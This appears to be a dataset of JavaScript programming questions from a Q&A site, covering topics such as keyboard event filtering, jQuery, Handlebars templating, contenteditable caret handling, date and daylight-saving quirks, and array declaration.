// Netscape/Firefox/Opera - which keypressed = e.keyCode || e.which; keychar = String.fromCharCode(keypressed); //alert(keychar); keycheck = /[a-zA-Z0-9\b]/; return keycheck.test(keychar);} //keyrestricted <head><script type=""text/javascript"">function keyRestricted(evt) { var theEvent = evt || window.event; var key = theEvent.keyCode || theEvent.which; var keychar = String.fromCharCode(key); //alert(keychar); var keycheck = /[a-zA-Z0-9]/; // backspace || delete || escape || arrows if (!(key == 8 || key == 27 || key == 46 || key == 37 || key == 39)) { if (!keycheck.test(keychar)) { theEvent.returnValue = false; //for IE if (theEvent.preventDefault) theEvent.preventDefault(); //Firefox } }}</script></head><body> Please modify the contents of the text field. <input type=""text"" value="""" onKeypress=""return keyRestricted(event)"" onKeydown=""return keyRestricted(event)"" /></body>","regex pattern for delete, arrows and escape keys"

in javascript html5 INPUT type='number' - distinguish between focus and value-change mouse clicks," In the HTML5 INPUT type='number' the user can change the value by clicking on up/down arrows that are part of the INPUT box. The user might also click in the box for focus or for editing its contents.Is there any easy way to distinguish between these two activities in the click trigger?from @cvsguimaraes answer, which better demonstrates the theory.using his methodology, here is my finished(?) version. the purpose: make sure regular change triggers are called when using +/- to change data. on chrome it's working flawlessly so far except that when you remove focus from the ITEM the change trigger will kick in again. I solved this by having a low level change trigger that stops propagation if the previous change call was from the mouseup. <code>  // input/mouseup triggers to call change from +/- mouse clicks// want to wait 500ms before calling change in case successive clicksrender.inputCh = false;render.inputCt = 0;render.inputFn = function(e) { render.inputCh = true;}render.mouseupFn = function(e) { if( render.inputCh ) { render.inputCh = false; render.inputCt++; setTimeout( next, 500 ); } function next() { render.inputCt--; if( render.inputCt ) return; var change = document.createEvent(""Event""); change.initEvent('change',true,true); e.target.dispatchEvent(change); }}// using input/mouseup triggersdocument.getElementById('number').addListener('input',render.inputFn,true);document.getElementById('number').addListener('mouseup',render.mouseuptFn,true);// normal change trigger - will be called normally and via +/- mouse clickdocument.getElementById('number').addListener('change',changeFn,false);",HTML5 INPUT type='number' - distinguish between focus and value-change mouse clicks

Cancle event triggering (blur) from another element's event (click)," I have a few rows with text, which I can ""edit"" by replacing the row inline with an input, which gets the text from the row as its value attribute.When the input looses focus, the previous text is restored.When pressing return (keyCode 13), the new text is saved and will be written in the row.Now, for the users who don't know to press return for saving the text, I want to add a ""Save"" button right next to the input field. But when pressing it, the blur event of the input field is getting fired first, discarding the changes.So is there an easy way, that the .click() event of the button can cancel the .blur() event on the input field?

For example in the example - 'multi-colored' should become higher value because it is more specific to the subject.

How to require CommonJS modules in the browser?," What is the best way to load CommonJS modules as client-side JavaScript code in the browser?CommonJS modules put their functionality in the module.exports namespace and are usually included using require(pathToModule) in a server-side script.

Handlebars.js & SEO," I have read a great deal of discussions about javascript templating and Search Engine Optimization. Still, I haven't found a satisfying answer to the question (either poorly-documented or outdated).Currently I am looking into handlebars.js as a client-side template solution, because I love the possibility to create helper functions. But what about indexing for search engines? Does the bot index the generated content (as intended) or only the source with the ugly javascript pseudo-variables? I know that there are lots of threads going on about this matter but I feel that nobody does exactly know the answer.If engines like Google would not index these templates properly, why would one bother using this for public websites?Another question within this context: Is it possible to render Handlebar.js templates on server side and then present them onto the client side?

"HTML5 Canvas Slow on Chrome, but Fast on FireFox"," I'm testing Chrome 15.0.874.106m on a dual-core 2.8 GHz Pentium Windows 7 system with 4 GB RAM (and a highly accelerated video card with lots of memory) and I'm testing FireFox 7.0.1 on a single-core 1.6 GHz Athalon Windows Vista Laptop with 2 GB RAM. Yet the FireFox system is outperforming the Chrome system by about 10 times (10 times the FPS by my visual estimation).Most of the posts I see are experiencing slower performance on FireFox and Chrome doing alright, but here I seem to have a severely reversed case. Any ideas on what could be responsible for this? The HTML file (single file, no dependencies) I'm testing is about 33 MB (16 MB compressed) and is available here.This is a follow up to HTML5 canvas performance on small vs. large files.I have discovered chrome://tracing which helped me acquire these profile results from running the problem file through the chrome profiler:Edit: Results deleted, I got some new much more interesting results which I will describe in the new section (see below). End EditI also discovered the --show-fps-counter, which showed the scrolling running around 3.5 FPS. But I'm still not clear where the problem is.I also found the --use-gl switch and tried desktop, egl and osmesa. The performance seemed to be best with osmesa, but only barely. I couldn't tell exactly how much because the show-fps-counter switch apparently doesn't work in conjunction with use-gl=osmesa. osmesa still doesn't perform nearly as well as FireFox on the other system.Edit Continued: Thanks to a fluke in the event handling I somehow got into a mode where I could scroll the map without holding the mouse button down. To my shock and amazement, it was scrolling very smoothly! With a few additional edits (namely, removing the code that handles the mouseup event) I switched the code so that I never need to hold the button to scroll. Lo and behold, I can consistently scroll very smoothly so long as I am not holding down the mouse button. So I profiled/traced the behavior using chrome://tracing with and without holding the mouse button down. My results are below.This is smooth scrolling without holding down the mouse button: And this is the choppy/slow scrolling when holding down the mouse button: From this comparison, it looks to me like Chrome's OnHandleInputEvent implementation is eating up all the time here.

Saving a file at client side using JavaScript," I want to save a JSON object to a file at client to persist it for future usage, I have tried following linewindow.open(""data:text/json;charset=utf-8,"" + escape(JSON.stringify(obj))); and it works!! Problem it asks user the location and name of the file for saving. What I want is I want the user completely unaware of the fact that something is being saved for future use or atleast keep it to minimum possible user clicks.How can I give the file name and location statically in window.open() ?Thanks in advance, EDITJust to make it clear that "" I don't store arbitrary or unwanted data. All the users are registered users of the system."" In normal conditions I don't store anything locally. However I want to store some JSON objects if the network was not available at the time of form submission.One obvious solution will be to use cookies.

jQuery - Difference between $.getScript() and $.get()," I am trying to understand what are the differences between $.getScript function in jQuery and the $.get. According to the documentation:http://api.jquery.com/jQuery.get/andhttp://api.jquery.com/jQuery.getScript/It gave me the feeling that with the $.getScript you can send data to the server (as with the $.get function) but you can't get data from the server (which you can with the $.get function). But it shows in the documentation of $.getScript, some lines below in the first example, that you can get also data with the line console.log(data); //data returned. So what is the differences? Is it that with $.getScript you can call only js scripts and with $.get you can call whatever file? What are the restrictions / benefits of using one function instead of the other? <code> ",Difference between $.getScript() and $.get()
How do you add functions to a jQuery object?," Let's say I have a <ul> list: I want to select it with jQuery, then add some functions to that object. For example, I'd like to add an addProduct(productData) function and a deleteProduct(productId) function. However, I'd like the functions to only be added to the object that's returned by the selector. So for example, something like this: How would I do this using jQuery? The key point here is that I only want to add the functions to an instance returned by a jQuery selector. In other words, I don't want to modify jQuery's prototype or create a plugin, since those will make the functions available across everything, whereas I only want to add the functions to one specific instance. <code>  <ul class=""products""> ...</ul> var productList = $.extend($('ul.products'), { addProduct: function(productData) { // add a new li item }, deleteProduct: function(productId) { // delete li with id }});","How to add functions to some jQuery objects, but not others?"

I mean I can't generate graphs like this:Is there any jQuery plugin (or javascript library) out there for this purpose ?I thought i can use WolframAlpha's API and use its images, something like this:but it have lots of problem:I can't move nodes or add remove edges interactively.Only 2000 API calls per month. Not enough.I can't produce large or intermediate graphs.They are really ugly!Please help me if you know some javascript library in order to draw Multigraphs, or anyway to produce such graphs (something like Dracula Graph Library but with ability to draw Multigraphs). <code> ",How to illustrate multigraphs in Javascript?

Executing javascript using IHTMLWindow2 execScript from C# using mshtml not working," I need to render an HTML page server-side and ""extract"" the raw bytes of a canvas element so I can save it to a PNG. Problem is, the canvas element is created from javascript (I'm using jquery's Flot to generate a chart, basically). So I guess I need a way to ""host"" the DOM+Javascript functionality from a browser without actually using the browser. I settled on mshtml (but open to any and all suggestions) as it seems that it should be able to to exactly that. This is an ASP.NET MVC project. I've searched far and wide and haven't seen anything conclusive. So I have this simple HTML - example kept as simple as possible to demonstrate the problem - which produces the expected output when run from a browser. I want to be able to load the original HTML into memory, execute the javascript function, then manipulate the final DOM tree. I cannot use any System.Windows.WebBrowser-like class, as my code needs to run in a service environment. So here's my code: The problem is, ""beforeScript"" and ""afterScript"" are exactly the same. The IHTMLDocument2 instance goes through the normal ""uninitialized"", ""loading"", ""complete"" cycle, no errors are thrown, nothing.Anybody have any ideas on what I'm doing wrong?

"javascript cloning a ""class"" instance"," I have a class that goes like this: Now I have an instance of this ""Class"" like so, el = new Element().

"Javascript: How dangerous is it, really, to assume undefined is not overwritten?"," Every time anyone mentions testing against undefined, it's pointed out that undefined is not a keyword so it could be set to ""hello"", so you should use typeof x == ""undefined"" instead. This seems ridiculous to me. Nobody would ever do that, and if they did it would be reason enough to never use any code they wrote... right?I found one example of someone who accidentally set undefined to null, and this was given as a reason to avoid assuming that undefined isn't overwritten. But if they'd done that, the bug would have gone undetected, and I fail to see how that's better.In C++ everyone is well aware that it's legal to say #define true false, but nobody ever advises you avoid true and use 0 == 0 instead. You just assume that nobody would ever be a big enough jerk to do that, and if they do, never trust their code again.Has this ever actually bitten somebody where someone else assigned to undefined (on purpose) and it broke your code, or is this more of a hypothetical threat? I'm willing to take my chances to make my code marginally more readable. Is this a really bad idea?To reiterate, I am not asking for how to protect against reassigned undefined. I've seen those tricks written 100 times already. I'm asking how dangerous it is to not use those tricks. <code> ","How dangerous is it in JavaScript, really, to assume undefined is not overwritten?"

How to document JavaScript data structures," I am looking for a descriptive way to document the used data structures in my JavaScript application. I find it hard to get this done due to the dynamic character of JavaScript.For instance, what could be a good way to tell, that a used variable distance is a two-dimensional array with length i and j and stores numbers between -1 and MAX_INT. I could think of something like this: What about an object which is used as a map/dictionary for certain data types, what about a two-dimensional array where the first element of an array defines other data then the rest, etc.Of course, it is always possible to document these things in a text, I just thought, maybe there is a well known and used way to do this in a semiformal way. <code>  distance[i][j] = -1 <= n <= MAX_INT",How to document JavaScript/CoffeeScript data structures

"""Optional"" expressions in handlebars.js?"," I'm writing a build script in node. In a nutshell, the script does the following:prompts the user for information (project name, description, etc)clones a template git reporenames files from their template name (e.g. com_foo_template.js --> com_foo_myproject.js)replaces tokens in the some template files based on the input in step 1I'm attempting to use Handlebars.js for the token replacement step.There's a second phase for deploying, which also involves token substitution. This is the root of my question.In some of the files, all of the tokens contained within will be replaced during init-time (the clone/rename/replace part). In other files, only some of these tokens will be replaced at init-time, and others won't be replaced until the deploy step runs (things like the deploy date, the git commit hash, etc.). Consider the following file: In this file, only {{name}} should be replaced at init-time; the other tokens should be replaced at deploy-time only. When I run my init step, though, the deploy-time tokens are replaced with empty strings: Is there a way to have handlebars not replace tokens if they don't exist in the object passed in? <code>  <zimletConfig name=""{{name}}"" version=""{{deploy_version}}""> <global> <property name=""allowedDomains"">*.foo.com</property> <property name=""gitCommit"">{{gitcommit}}</property> <property name=""deployDate"">{{deploydate}}</property> </global></zimletConfig> <zimletConfig name=""com_foo_myproject"" version=""""> <global> <property name=""allowedDomains"">*.foo.com</property> <property name=""gitCommit""></property> <property name=""deployDate""></property> </global></zimletConfig>","Missing (or ""optional"") expressions in handlebars.js?"

Javascript - How do you store object references in HTML elements?," I am building a form in HTML out of a javascript object that I've imported from a JSON file.I use a recurisve algorithm to build HTML tables, and respective elements (labels, text boxes, etc.)The fields load with the value of the current node.The idea is to edit the values in the textboxes; which in turn updates the javascript object. Whenchanges have been made, the editor will send the JSON object to the server and update the file.The puzzling question, is how do I reference the node that has been changed? I have tried several approaches to no avail.EDIT:This is a basic idea of what I'm doing: Now, how do I bind the value of obj[key] to the text boxes, so that when I change thevalue it updates the Javascript object? <code>  function build_tree(obj, depth) { for (key in obj) { if (typeof(obj[key]) == 'object') { print(key + ""<input type=""text"" value='"" + obj[key] + ""'>""); build_tree(obj[key], depth + 1); } else print(key + ""<input type=""text"" value='"" + obj[key] + ""'>"");}",How do you store object references in HTML elements?

How to prevent users from accessing application from Desktop shortcut (saved page)," I have a web application which is used by lots of non-technical users. I have found that several of these users are saving the login page of the application to their desktops (which also saves the associated CSS and JS files). Then, to start using the application, they double click on that desktop icon which shows the local copy using the file:// protocol. This can cause problems later on, e.g. if I change the login form, or the URL it posts to, etc. Also, certain javascript utilities, e.g. PIE.htc don't work using the file:// protocol.Obviously what they should be doing is saving a browser bookmark/favorite, I'm looking for a way of detecting and warning those users without confusing the rest. I have been using some javascript to warn these users: But this will only warn users that have saved the desktop copy since I have added this piece of javascript. Has anyone else had this problem and come up with clever solutions that they'd like to share?ThanksUpdate:In the end I decided to do this by setting a cookie with a nonce value upon login page request, and storing the same value as a hidden field in the form. Then, in the form submit handler, check that the two are the same and show an error message if not. One could store the nonce in a session instead of a cookie, but I don't want to create unnecessary sessions.If the user has saved the login page locally, they will likely have different nonce values in the saved form compared to the cookie (if they have a cookie at all).Normally one wouldn't add CSRF protection (that's sort of what this is) to a login form, but it fulfills my requirements. I read about this technique on The Register, http://www.theregister.co.uk/2009/10/02/google_web_attack_protection/, Google implemented similar protection for their login forms, to protect against forging of login requests, http://en.wikipedia.org/wiki/Cross-site_request_forgery#Forging_login_requests.  <code>  if (top.location.protocol == 'file:') { alert('This application is not designed to be accessed from a desktop copy...')}",How to prevent users from accessing a web application from a locally saved Html login page?
Javascript: get function parameter names for interface purposes," can anyone help me on how to retrieve function parameter names? For example: I need to get the parameter names outside the function, which is a, b, and c (as in literally as strings, such as to be put in an array [""a"", ""b"", ""c""]), so I can validate not only object/class properties in a class towards an interface, but also the parameters.Before this question starts raising confusion, let me explain about interface implementation in my term and the reason why I need the answer of the question above:First of all, I found one interesting way I would like to use in implementing interface by Glen Ford in JavaScript: (Please see the detail about the implementation from http://knol.google.com/k/programming-to-the-interface-in-javascript-yes-it-can-be-done-er-i-mean-faked#).However, the implementation above only validates the object properties (variable and methods) only, which is not enough for me.I need more validation to parameter level, so that the code that implements one interface should follow the interface methods and also follow the parameters from the interface methods as well.PS. Please don't argue about why use interface or why it's useless or useful; instead it's most useful if you can provide better interface implementation. The focus here is I just need to know how to get function parameter names. <code>  var A = function(a, b, c) {}; for (var member in theInterface) { if ( (typeof theObject[member] != typeof theInterface[member]) ) { alert(""object failed to implement interface member "" + member); return false; }}",Get function parameter names for interface purposes

Debugging javascript in Visual Studio (or other JS debugger)," I have a .js file that normally gets executed by cscript.exe (i.e. is not run in the browser and cannot be run there).I know, that I can feed cscript.exe the //X parameter in order to get asked for a debugger to choose. Ok. That's fine.I select ""Visual Studio 2005 Debugger"", IDE comes up, execution stops on the first line. Fine.Script terminates (or I terminate it), I edit something and want to debug it again.Simple thought would be just to hit F5 and run the debugger again. But this doesn't work. VS just tells me that it couldn't find any debugging symbols in cscript.exe:What now? Starting cscript.exe from the command line again for each debug run is quite cumbersome in my opinion.Is there a way to simply debug the script with VS? Also hints for other debugging tools would be appreciated.Edit:The answer of t0nyh0 is pretty close. I create a dummy console application, compile and the debugger comes up. However, two things are not perfectcscript.exe always asks for the debugger to use (which instance of VS).Could this be overcome by specifying a certain debugger instance directly in the command line?In order to fire a post-build event, there have to be some modifications in the sources.

Add linebreak to textContent only in Chrome," This is a complicated one! Im working with contentEditable in Chrome and I'm experiencing a head melting problem. When I press the return key, Chrome inserts a new div into the innerHTML. This is fine and dandy. The problem is that the line break is nowhere to be found in the div's textContent. I really need to figure out a way to add the line break to the textContent in the same place as the div break in the innerHTML. Any Ideas?UPDATE:I can use innerText but then line breaks that are there when the page loads are ignored. I need consistency across one of these methods. In other words, I need textContent to show newly inputted line breaks or innerText to show line breaks that existed on page load.Here's an updated demo:  <code>  function checkit() { var c1 = document.getElementById('c1') alert(""TEXTCONTENT:\n"" + c1.textContent + ""\n\nINNERTEXT:\n"" + c1.innerText + ""\n\nINNERHTML:\n"" + c1.innerHTML)} div {padding: 20px; border-bottom: 1px solid #CCC;} <div><a href=""#"" onclick=""checkit()"">check it</a></div><div contentEditable=""true"" id=""c1"">click inside this <b>div</b>,press return and then press <b>check it</b> above</div>",Add linebreak to textContent or innerText only - in Chrome

What is the preferred way of calling Underscore.js functions?," Underscore.js has two ways of calling functions, which I will refer to as object-style and function-style. Object-style looks like the following: Function-style, on the other hand, looks like this: I was happily using object-style calls in my code, but at some point, however, the object style of call disappeared from the underscore.js documentation (though object-style calls still work perfectly fine). I've also seen hints around the place (like in the backbone.js documentation) that the function-style is 'better' or 'preferred'.So, is the function-style of call the preferred method? And if so, can someone explain the reasoning behind this?Update: @ggozad has partially answered my question. But it seems my understanding of how underscore.js works was formed way back around version 0.4.2. Reading through the change history for underscore.js, you can see this entry for version 1.2.4: You now can (and probably should) write _.chain(list) instead of _(list).chain().I would like to know why you should write _.chain(list) instead of _(list).chain(). <code>  _(myObject).each(function (val, key) { console.log(key, val);}); _.each(myObject, function (val, key) { console.log(key, val);});",What is the preferred way of chaining Underscore.js functions?
Prevent popstate from jumping to top," I'm creating a single-page and using pushState to change the adress. Now, if I push back, popstate is fired and I want to animate the page scrolling from the current position to the last position. That works, of course, but the page jumps to the top.Does anyone know how to prevent that behavior? I'm using jQuery to animate the scrolling....Thanks :)// edit: ok I found out, if I animate the scrolling and then changing the url, it won't jump around - but now I have to double-press the back button to get back...http://www.testwebseiten.at/user/falk/stein-jagersbacher.atThe code is a little messy so I explain it a little: The sjag contains several options and methods... so sjag.index contains just 'index.php', sjag.scrollToSection contains the animation.On clicking a link of the navigation, the following function gets called: $(this).data('sjagpage') contains the jQuery-element.When I don't animate the scrolling it only needs one click to get back - but when I now animate it, it needs two... why? <code>  var scrollCurrentSection = function(event) { if (typeof event.preventDefault != 'undefined') event.preventDefault(); var page = """"; if (window.location.href.substr(-1) == '/') page = sjag.index; else page = window.location.href.match(/([^\/]+)$/)[1]; $this = $('a[href$=""'+page+'""]'); if ($this.length) { sjag.scrollToSection($this); } } window.onpopstate = scrollCurrentSection; // set navi $(""#navi a, #navi-add a"").click(function(event) { var data = $(this).data('sjagpage'); if (typeof data == 'undefined') return; event.preventDefault(); // animate scrolling $this = $(this); sjag.scrollToSection($(this), function() { history.pushState("""", """", $this.attr('href')); }); });",popstate - need to click twice on back button to actually get back

get webworker script with post," How can I use create a Web worker from a string (which is supplied via a POST request)?One way I can think of, but I'm not sure how to implement it, is by creating a data-URI from the server response, and passing that to the Worker constructor, but I've heard that some browsers don't allow this, because of the same origin policy.MDN states the uncertainty about the origin policy around data URI's: Note: The URI passed as parameter of the Worker constructor must obey the same-origin policy. There is currently disagreement among browsers vendors on whether data URIs are of the same-origin or not; Gecko 10.0 (Firefox 10.0 / Thunderbird 10.0) and later do allow data URIs as a valid script for workers. Other browsers may disagree.Here's also a post discussing it on the whatwg. <code> ",How to create a Web Worker from a string

javascript and daylight savings time -- an example out of 2006," I have read many StackOverflow questions on the javascript new Date() object when it comes to daylight savings time lines -- as in when they are crossed. However, I haven't seen an answer about this particular problem or a way to work around it while still relying on 'unix time'.I have personally chosen to work around this issue by passing the javascript date as a date to my PHP code rather than the unix time. Yet, the nagging question still remains! I have confirmed this behavior on IE8, Chrome, and FF so I'm assuming it will behave the same for you. (Update: OSX users might not be able to generate this behavior)My Research; the closest questions to my issue:This user was working on the particular hours right around the DST change.This user was worried about the presentation of the time depending on the user's time zone. The accepted answer on that page mentioned that getTimezoneOffset is ""flaky"" which led me to not delve into that.See my answer below on other questions that have some great insightsI have generated a test scenario around November 1st, 2006. This may or may not work the same for you depending on the time zone you are in. If I understand the javascript aspect correctly, you will need to synchronize your PC's clock toEastern Time (US & Canada) and check the 'Automatically adjust clock for Daylight Saving Time'.I am basing this experiment off of the ""Indianapolis"" time zone in PHP. My javascript result, when I find the unix time for November 1st, 2006 is one hour off of what the PHP generates (3600 seconds). According to this page (Thanks Jon!) javascript is wrong.The two languages results' come back into agreement on 11/06/2006!This and other research causes me to believe that Javascript got its history wrong and picked the wrong Sunday to 'Fall back' out of DST -- thereby causing the discrepancy I am seeing.I have tried to simplify this as much as possible but there are still quite a few gears in motion.Here is the PHP code and output that shows the CORRECT number of milliseconds until the date 11/01/2006.date_default_timezone_set(""America/Indiana/Indianapolis"");echo ""Unixtime for November 1, 2006 is: "".strtotime(""11/01/2006"").""\n"";echo ""Unixtime for November 6, 2006 is: "".strtotime(""11/06/2006"");The result is: Both of them are based off of GMT-0500.In Javascript, (see my jsfiddle**), I call new Date and then getTime() upon it like so (and remove the milliseconds):new Date(""2006/11/01"").getTime()/1000new Date(""2006/11/06"").getTime()/1000This generates the values which is a difference (for 2006/11/01) from the output via PHP of 3600 seconds -- or one hour.

javascript versus PHP at the daylight savings time line -- an example out of 2006," I have read many StackOverflow questions on the javascript new Date() object when it comes to daylight savings time lines -- as in when they are crossed. However, I haven't seen an answer about this particular problem or a way to work around it while still relying on 'unix time'.I have personally chosen to work around this issue by passing the javascript date as a date to my PHP code rather than the unix time. Yet, the nagging question still remains! I have confirmed this behavior on IE8, Chrome, and FF so I'm assuming it will behave the same for you. (Update: OSX users might not be able to generate this behavior)My Research; the closest questions to my issue:This user was working on the particular hours right around the DST change.This user was worried about the presentation of the time depending on the user's time zone. The accepted answer on that page mentioned that getTimezoneOffset is ""flaky"" which led me to not delve into that.See my answer below on other questions that have some great insightsI have generated a test scenario around November 1st, 2006. This may or may not work the same for you depending on the time zone you are in. If I understand the javascript aspect correctly, you will need to synchronize your PC's clock toEastern Time (US & Canada) and check the 'Automatically adjust clock for Daylight Saving Time'.I am basing this experiment off of the ""Indianapolis"" time zone in PHP. My javascript result, when I find the unix time for November 1st, 2006 is one hour off of what the PHP generates (3600 seconds). According to this page (Thanks Jon!) javascript is wrong.The two languages results' come back into agreement on 11/06/2006!This and other research causes me to believe that Javascript got its history wrong and picked the wrong Sunday to 'Fall back' out of DST -- thereby causing the discrepancy I am seeing.I have tried to simplify this as much as possible but there are still quite a few gears in motion.Here is the PHP code and output that shows the CORRECT number of milliseconds until the date 11/01/2006.date_default_timezone_set(""America/Indiana/Indianapolis"");echo ""Unixtime for November 1, 2006 is: "".strtotime(""11/01/2006"").""\n"";echo ""Unixtime for November 6, 2006 is: "".strtotime(""11/06/2006"");The result is: Both of them are based off of GMT-0500.In Javascript, (see my jsfiddle**), I call new Date and then getTime() upon it like so (and remove the milliseconds):new Date(""2006/11/01"").getTime()/1000new Date(""2006/11/06"").getTime()/1000This generates the values which is a difference (for 2006/11/01) from the output via PHP of 3600 seconds -- or one hour. This value (one hour earlier) when processed in my PHP application generated the prior day (2006/10/31) which was unacceptable since it broke my navigation forward.

"jQuery: Drop-down Search Box, Blur Issues"," I've implemented a search box that acts as a filter.

The only bit I'm having trouble with is selecting results. The blur event seems to trigger before result.click events and the handler is never called.

Javascript OpenLayers event listener for before a zoom," I am trying to set up OpenLayers to not display the vector layer just before a zoom starts and make it reappear after a zoom ends. I have the zoom ends part already established like this: But I don't see any kind of event listener for the start of a zoom in the documentation. There is a ""movestart"" which covers moving, panning, and zoom. Unfortunately, I can't use the ""movestart"" one, because I don't want the layer to disappear during a pan. You would think there would be a ""zoomstart"", as there is a ""zoomend"".The reason I am trying to do this, is because I don't like how the vector layer zooms at a different rate when using Google Maps as a base layer. It looks wrong, looks like all the features are inaccurate, even though they land in the right place after the zoom is complete.Any suggestions? <code>  map = new OpenLayers.Map('map_element', { eventListeners: { ""zoomend"": mapEvent}});function mapEvent(event) { if(event.type == ""zoomend"") { hide_vector_layer(); }}",Javascript OpenLayers before zoom event listener

How to make mouse event once for parent elements?," When entering a DOM element, mouseover event will happen. Upon moving the mouse around the current element, no event happens, as mouseover is for entering.However, this rule is not obeyed for child nodes. If moving the mouse over child nodes, the mouseover event will be triggered again and again, though no new event, as we are still in the original parent.See this example. If we move the mouse over the parent (actually on its textNode), nothing new happens, but if we go to the child element (still on the parent), it will trigger the mouseover event again and again. In fact it will fire the mouse event every time mouse enters an elements (even inside the original parent element).How we can make the mouseover only once for moving all over the parent (the original element in the addEventListener)? In the given example, I mean to avoid firing the event upon moving the mouse on the child element. <code> ",How to fire mouse event once for moving over child elements in Javascript?

How can I get the word that the caret is upon inside a contenteditable div?," I am trying to extract a single word from a content editable div at the position, when the mouse is clicked. For example:Lorem ipsum dolor sit amet, cons|ectetur adipiscing elit. Cras vestibulum gravida tincidunt. Proin justo dolor, iaculis vulputate eleifend et, facilisis eu erat.*Using the | to represent the caret, the function should return ""consectetur"".My code: A function is bound to the mouse click event of the contenteditable div, which calculates the caret position and then finds the indexes of the preceding and following space characters (or beginning or end of the string altogether) and uses substring to determine the word. There is a quick regex match to remove punctuation and whitespace and we finally end up with the correct word.This worked fine, when there was a single text node inside the contenteditable div, but as soon as I started dropping and other assorted tags, the part of the method that calculated the caret position stopped working, always calculating it to be 0. Is there a way to calculate the caret position in HTML like it did with the text?If not, can anyone suggest an alternate method? <code>  window.onload = function () { document.getElementById(""text-editor"").onclick = function () { var caretPos = 0, containerEl = null, sel, range; if (window.getSelection) { sel = window.getSelection(); if (sel.rangeCount) { range = sel.getRangeAt(0); if (range.commonAncestorContainer.parentNode == this) { caretPos = range.endOffset; } } } else if (document.selection && document.selection.createRange) { range = document.selection.createRange(); if (range.parentElement() == this) { var tempEl = document.createElement(""span""); this.insertBefore(tempEl, this.firstChild); var tempRange = range.duplicate(); tempRange.moveToElementText(tempEl); tempRange.setEndPoint(""EndToEnd"", range); caretPos = tempRange.text.length; } } var prevSpace, nextSpace, text = this.innerText; prevSpace = text.substring(0,caretPos).lastIndexOf("" ""); nextSpace = text.indexOf("" "", caretPos + 1); nextSpace == -1 ? nextSpace = text.length - 1 : false; prevSpace++; console.log([prevSpace,caretPos,nextSpace].join(""|"")); var word = text.substring(prevSpace, nextSpace); //Removes punctuation and whitespace. var patt = new RegExp(""([A-Za-z0-9']*)"",""g""); word = patt.exec(word)[0]; document.getElementById(""current-word"").innerHTML = word; }; };",Get the word upon which the caret sits within a contenteditable div?

Can Angular.js auto-update a view if a persistent model (server database) is changed by an external app?," I'm just starting to familiarize with AngularJS, but I would like to build a web app that has a view that gets auto-upated in real-time (no refresh) for the user when something changes in the server-side database.Can AngularJS handle this (mostly) automatically for me? And if so, what is the basic mechanism at work?For example, do you somehow setup AngularJS to poll the DB regularly for ""model"" changes? Or use some sort of Comet-like mechanism to notify AngularJS client-side code that the model has changed?In my application, the challenge is that other (non-web) server-side software will be updating the database at times. But this question applies equally to pure web-apps where you might have multiple clients changing the database through AngularJS web clients, and they each need to be updated when one of them makes a change to the DB (model). <code> ",Can AngularJS auto-update a view if a persistent model (server database) is changed by an external app?

jQuery keydown repeat delay," The objective is manually set a held key's ""repeat rate"".For example, when in a text box and pressing and holding the X key, I understand that there is browser-specific ways of repeating the pressed character. In some, it pauses, then continuously triggers the pressed key. In others, it doesn't repeat at all. I want to mitigate this by forcing the pressed key to repeat at a specific interval, regardless of browser.Through research, I've come up with a timer-based attempt, but in Safari, it does not repeat the character. I've got a menu system where holding down arrow scrolls through the list, but the translation animation and repeat rate don't like each other. I may have botched this whole thing up...I tried to recreate a simplified version of this SO post. However, I feel there has to be a better way of doing this. Any thoughts?Update:We can assume that the end-user hasn't set their OS keyboard repeat rate greater than the rate I want to use (1000ms). If it is, then it should fall back to their repeat rate, since it won't keep triggering the key press event. If it isn't (more likely since most people don't modify that), then we would be overriding that behavior to make it delay our specified period.  <code>  var repeating = false;var repeatRateTimer = null;$( document ).bind( 'keyup', function( input ) { if( repeatRateTimer != null ) { clearTimeout( repeatRateTimer ); repeatRateTimer = null; } repeating = false;} );$( document ).bind( 'keydown', function( input ) { input.preventDefault( ); if( repeating == true ) { if( repeatRateTimer != null ) { clearTimeout( repeatRateTimer ); repeatRateTimer = null; } else { repeatRateTimer = setTimeout( function( ){ repeating = false; }, 1000 ); } return; } repeating = true; // ...keyboard logic} );","Is it possible to override the keydown repeat delay, in JavaScript?"

The way I go about this is a simple JavaScript script that:looks for mousemove & click events over a certain polygonmeasures the amount of movementchanges half of the coordinates of the polygon (in order to have the effect of stretching) using this algorithm to define new coordinates: x = x_movement, y = x_movement * Math.tan( 31 * (Math.PI/180) )polygons that are filled with a single colour are OKpolygons that are filled with a gradient are not, let me demonstrate:VisuallySo this is step one, no stretching has been done by the user.This is where the problem happens. Since I don't know how should I change the x1, y1 and x2, y2 coordinates for the gradient, it just stays hanging in it's old position while the polygon has been stretched. The result is a shape that fails to sustain the illusion of depth.The end result I'm looking for. And bare in mind that the gradient might have a completely random angle from the get go. In this end result, that I'm looking for, both the x1, y1 and x2, y2 coordinates of the gradient have been changed. What algorithm should be used to calculate these positions? I'm looking for a solution that is completely blind to the angle of the gradient.Below is the SVG with all the appropriate coordinates that was used to generate these examples:Using SVG codeStep1: Step 2 Step 3 I've spent countless hours developing solutions for this problem and I just couldn't get my head around it. Any help would be greatly appreciated.Update: gradientTransform not quiteUsing the gradientTransform attribute and no x1,y1; x2,y2 coordinates for the gradient, we achieve results that fill the polygon in a way that is almost as needed (This solution can be found here: http://jsfiddle.net/hqXx2/). The only place where the solution breaks is when the polygon is filled with a gradient that starts outside of the polygon and/or ends somewhere outside/inside. Let me illustrate:This is what is achieved with the solution, that Duopixel is suggesting.This is the usage case that is impossible to achieve using the solution mentioned above. I changed the colouring in order to visibly amplify the angle and gradient stops.SVG Code from the exampleHere's the code for the larger, correctly expanded group of polygons: And here's the SVG code for the smaller one, which I need to expand: @dignifiedquire take on this problemI've implemented @dignifiedquire suggested algo in a test site: Here's the test link. I did the absolute to relative conversion on my own and it just shows the same result I would have normally adding the same polygon x and y change values to the gradient x and y. That is the main issue - how to translate those values into such value, that transform the gradient as in my examples above?More help is needed. <code>  <!-- Step 1 --><linearGradient

What is the most standard way of declaring an array in JavaScript? (beginer)," I'm just learning JavaScript and it seems like there are a number of ways to declare arrays.var myArray = new Array()var myArray = new Array(3)var myArray = [""apples"", ""bananas"", ""oranges""]var myArray = [3]What are their difference, and what are the preferred ways?According to this website the following two lines are very different: As you can see these two lines do two very different things. If you had wanted to add more than one item then badArray would be initialized correctly since Javascript would then be smart enough to know that you were initializing the array instead of stating how many elements you wanted to add.Is what the authors trying to say is Array(10) creates an array with precisely 10 elements and [10] creates an array of undefined size with the 0th element being 10?

